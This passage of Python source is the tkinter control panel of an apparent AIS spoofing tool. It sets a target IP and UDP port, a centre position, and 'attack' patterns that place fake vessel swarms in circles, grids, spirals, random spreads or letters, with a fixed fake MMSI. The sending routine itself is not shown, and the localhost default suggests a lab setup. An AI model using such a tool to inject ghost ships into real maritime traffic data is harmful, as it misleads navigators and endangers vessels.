        self.log_box.tag_config("info", foreground="#94a3b8")

        # 구분선
        sep = tk.Frame(main, width=1, bg="#1e2a3a")
        sep.pack(side="left", fill="y")

    def _build_network_section(self, parent):
        self._section(parent, "네트워크")
        self.host_entry = self._row(parent, "대상 IP", self._entry, default="127.0.0.1")
        self.port_entry = self._row(parent, "UDP 포트", self._entry, default="1111")
        self.interval_spin = self._row(parent, "업데이트 주기(초)",
                                       self._spin, from_=0.5, to=30.0, default=2.0, step=0.5)

    def _build_center_section(self, parent):
        self._section(parent, "기준 좌표")
        self.lat_entry = self._row(parent, "중심 위도 (°N)", self._entry, default="35.05")
        self.lon_entry = self._row(parent, "중심 경도 (°E)", self._entry, default="129.15")

    def _build_attack_section(self, parent):
        self._section(parent, "공격 유형")
        attack_types = ["원형 선단", "격자 선단", "나선형", "랜덤 확산", "JBU 글자"]
        self.attack_var = tk.StringVar(value="원형 선단")
        row = ttk.Frame(parent)
        row.pack(fill="x", padx=16, pady=4)
        combo = ttk.Combobox(row, textvariable=self.attack_var,
                             values=attack_types, state="readonly",
                             font=("Consolas", 11))
        combo.pack(fill="x")
        combo.bind("<<ComboboxSelected>>", self._on_attack_change)

    def _build_circle_section(self, parent):
        self.circle_frame = ttk.Frame(parent)
        self.circle_frame.pack(fill="x")
        self._section(self.circle_frame, "원형 선단 설정")
        self.circle_count = self._row(self.circle_frame, "선박 수",
                                      self._spin, from_=1, to=50, default=15, step=1)
        self.circle_radius = self._row(self.circle_frame, "반지름 (°, ~111km/°)",
                                       self._spin, from_=0.01, to=2.0, default=0.22, step=0.01)
        self.circle_speed = self._row(self.circle_frame, "각속도 (rad/tick)",
                                      self._spin, from_=0.001, to=0.1, default=0.008, step=0.001)

    def _build_grid_section(self, parent):
        self.grid_frame = ttk.Frame(parent)
        self.grid_frame.pack(fill="x")
        self._section(self.grid_frame, "격자 선단 설정")
        self.grid_rows = self._row(self.grid_frame, "행 수",
                                   self._spin, from_=1, to=20, default=5, step=1)
        self.grid_cols = self._row(self.grid_frame, "열 수",
                                   self._spin, from_=1, to=20, default=5, step=1)
        self.grid_spacing = self._row(self.grid_frame, "간격 (°)",
                                      self._spin, from_=0.005, to=0.5, default=0.05, step=0.005)
        self.grid_speed = self._row(self.grid_frame, "속도 (노트)",
                                    self._spin, from_=0, to=30, default=5.0, step=0.5)
        self.grid_heading = self._row(self.grid_frame, "진행 방향 (°)",
                                      self._spin, from_=0, to=359, default=0, step=5)
        self.grid_frame.pack_forget()

    def _build_spiral_section(self, parent):
        self.spiral_frame = ttk.Frame(parent)
        self.spiral_frame.pack(fill="x")
        self._section(self.spiral_frame, "나선형 설정")
        self.spiral_count = self._row(self.spiral_frame, "선박 수",
                                      self._spin, from_=3, to=60, default=20, step=1)
        self.spiral_turns = self._row(self.spiral_frame, "회전 수",
                                      self._spin, from_=0.5, to=5.0, default=2.0, step=0.5)
        self.spiral_max_r = self._row(self.spiral_frame, "최대 반지름 (°)",
                                      self._spin, from_=0.05, to=1.5, default=0.30, step=0.01)
        self.spiral_speed = self._row(self.spiral_frame, "회전 속도 (rad/tick)",
                                      self._spin, from_=0.001, to=0.05, default=0.005, step=0.001)
        self.spiral_frame.pack_forget()

    def _build_random_section(self, parent):
        self.random_frame = ttk.Frame(parent)
        self.random_frame.pack(fill="x")
        self._section(self.random_frame, "랜덤 확산 설정")
        self.random_count = self._row(self.random_frame, "선박 수",
                                      self._spin, from_=1, to=100, default=30, step=1)
        self.random_spread = self._row(self.random_frame, "확산 반경 (°)",
                                       self._spin, from_=0.05, to=2.0, default=0.3, step=0.05)
        self.random_frame.pack_forget()

    def _build_jbu_section(self, parent):
        self.jbu_frame = ttk.Frame(parent)
        self.jbu_frame.pack(fill="x")
        self._section(self.jbu_frame, "JBU 글자 선단 설정")
        self.jbu_scale = self._row(self.jbu_frame, "글자 크기 배율",
                                   self._spin, from_=0.5, to=5.0, default=1.0, step=0.1)
        self.jbu_frame.pack_forget()

    def _build_extra_section(self, parent):
        self._section(parent, "추가 옵션")
        row = ttk.Frame(parent)
        row.pack(fill="x", padx=16, pady=4)
        self.anchor_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(row, text="중앙 정박 선박 추가 (MMSI: 440123456)",
                        variable=self.anchor_var).pack(anchor="w")

    def _build_control_section(self, parent):
        ttk.Separator(parent, orient="horizontal").pack(fill="x", padx=10, pady=10)
        ctrl = ttk.Frame(parent)
        ctrl.pack(fill="x", padx=10, pady=(0, 16))

        self.start_btn = tk.Button(
            ctrl, text="▶  공격 시작",
            bg="#00d4ff", fg="#0a0e1a",
            font=("Consolas", 12, "bold"),
            activebackground="#38bdf8",
            relief="flat", cursor="hand2",
            padx=20, pady=8,
            command=self.start_attack
        )
        self.start_btn.pack(side="left", fill="x", expand=True, padx=(0, 4))

        self.stop_btn = tk.Button(
            ctrl, text="■  중단",
            bg="#1e2a3a", fg="#ff4757",
            font=("Consolas", 12, "bold"),
            activebackground="#2d3f55",
            relief="flat", cursor="hand2",
            padx=20, pady=8,
            state="disabled",
            command=self.stop_attack
        )
        self.stop_btn.pack(side="right", fill="x", expand=True, padx=(4, 0))

    def _on_attack_change(self, event=None):
        at = self.attack_var.get()
        frames = {
            "원형 선단": self.circle_frame,
            "격자 선단": self.grid_frame,
            "나선형": self.spiral_frame,
            "랜덤 확산": self.random_frame,
            "JBU 글자": self.jbu_frame,
        }
        for name, frame in frames.items():
            if name == at:
                frame.pack(fill="x")
            else:
                frame.pack_forget()

    def _get_cfg(self):
        try:
            cfg = {
                "host": self.host_entry._var.get().strip(),
                "port": int(self.port_entry._var.get()),
                "interval": float(self.interval_spin._var.get()),
                "center_lat": float(self.lat_entry._var.get()),
                "center_lon": float(self.lon_entry._var.get()),
                "attack_type": self.attack_var.get(),
                "add_anchor": self.anchor_var.get(),
                # 원형
                "circle_count": min(200, max(1, int(float(self.circle_count._var.get())))),
                "circle_radius": float(self.circle_radius._var.get()),
                "circle_speed": float(self.circle_speed._var.get()),
                # 격자
                "grid_rows": min(30, max(1, int(float(self.grid_rows._var.get())))),
                "grid_cols": min(30, max(1, int(float(self.grid_cols._var.get())))),
                "grid_spacing": float(self.grid_spacing._var.get()),
                "grid_speed": float(self.grid_speed._var.get()),
                "grid_heading": float(self.grid_heading._var.get()),
                # 나선
                "spiral_count": min(200, max(3, int(float(self.spiral_count._var.get())))),
                "spiral_turns": float(self.spiral_turns._var.get()),
                "spiral_max_radius": float(self.spiral_max_r._var.get()),
                "spiral_speed": float(self.spiral_speed._var.get()),
                # 랜덤
                "random_count": min(300, max(1, int(float(self.random_count._var.get())))),
                "random_spread": float(self.random_spread._var.get()),
                # JBU
                "jbu_scale": float(self.jbu_scale._var.get()),
            }
            return cfg
        except ValueError as e:
            messagebox.showerror("입력 오류", f"설정값 확인 필요:\n{e}")
            return None

    def start_attack(self):
        global running, send_thread
        cfg = self._get_cfg()
        if cfg is None:
            return

        running = True
        self.start_btn.config(state="disabled", bg="#1e2a3a", fg="#64748b")
        self.stop_btn.config(state="normal")
        self.log("[시작]", "start")

        send_thread = threading.Thread(
            target=send_loop, args=(cfg, log_queue), daemon=True)
        send_thread.start()

    def stop_attack(self):
        global running
        running = False
        self.start_btn.config(state="normal", bg="#00d4ff", fg="#0a0e1a")
        self.stop_btn.config(state="disabled")
        self.log("[중단] 공격 중단 요청됨.", "error")

    def log(self, msg, tag=None):
        ts = time.strftime("%H:%M:%S")
        self.log_box.insert("end", f"[{ts}] {msg}\n", tag or "info")
        self.log_box.see("end")

    def _poll_log(self):
        while not log_queue.empty():
            msg = log_queue.get_nowait()
            tag = "error" if "[오류]" in msg or "[치명" in msg else \
                  "start" if "[시작]" in msg or "[종료]" in msg else "info"
            self.log(msg, tag)
        self.after(200, self._poll_log)


# ──────────────── 진입점 ────────────────

if __name__ == "__main__":
    app = App()
    app.mainloop()
```
